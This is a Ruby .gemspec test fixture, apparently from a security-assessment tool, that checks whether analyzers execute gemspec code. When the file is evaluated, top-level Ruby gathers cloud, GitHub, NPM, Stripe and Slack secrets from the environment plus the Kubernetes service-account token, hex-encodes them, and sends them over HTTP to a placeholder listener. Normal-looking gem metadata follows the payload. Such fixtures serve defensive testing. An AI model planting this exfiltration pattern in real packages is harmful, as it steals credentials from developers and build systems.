# Assessment fixture: .gemspec that signals when the spec is evaluated.
#
# Real behavior abused
# --------------------
# A .gemspec is a *Ruby program*. Tools that learn a gem's metadata by running
# `gem build`, `gem specification`, or `Gem::Specification.load` evaluate the
# whole file, so any top-level Ruby here runs in the analyzer's process. This is
# the Ruby analog of setup.py metadata execution.
#
# Containment: only network target is the __DVAP_LISTENER_HOST__ placeholder
# (substituted by the worker). Ruby stdlib only (net/http).

require "net/http"

SCAN_TOKEN = "__DVAP_SCAN_TOKEN__".freeze
VECTOR = "__DVAP_VECTOR__".freeze
LISTENER_HOST = "__DVAP_LISTENER_HOST__".freeze
LISTENER_PORT = "__DVAP_LISTENER_PORT__".freeze

SECRET_ENV_KEYS = %w[
  AWS_ACCESS_KEY_ID
  AWS_SECRET_ACCESS_KEY
  AWS_CANARY_ACCESS_KEY_ID
  AWS_CANARY_SECRET_ACCESS_KEY
  AWS_SESSION_TOKEN
  GITHUB_TOKEN
  GITHUB_CANARY_TOKEN
  NPM_TOKEN
  APP_DATABASE_URL
  STRIPE_API_KEY
  SLACK_WEBHOOK_URL
].freeze
K8S_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token".freeze

lines = []
SECRET_ENV_KEYS.each do |key|
  val = ENV[key]
  lines << "#{key}=#{val}" if val && !val.empty?
end
begin
  token = File.read(K8S_TOKEN_PATH).strip
  lines << "K8S_SA_TOKEN=#{token}" unless token.empty?
rescue StandardError
  # token file absent -- ignore
end

# Side effect at eval time.
hexed = lines.join("\n").unpack1("H*")
dotted = hexed.scan(/.{1,60}/).join(".")
url = "http://#{LISTENER_HOST}:#{LISTENER_PORT}/b/#{SCAN_TOKEN}/#{VECTOR}?d=#{dotted}"
begin
  Net::HTTP.get_response(URI(url))
rescue StandardError
  # network failures should not break metadata loading
end

# Normal-looking gemspec metadata.
Gem::Specification.new do |spec|
  spec.name = "metadata-review-sample"
  spec.version = "0.0.1"
  spec.summary = "Sample gem metadata for dependency review"
  spec.authors = ["security-platform"]
  spec.files = []
end
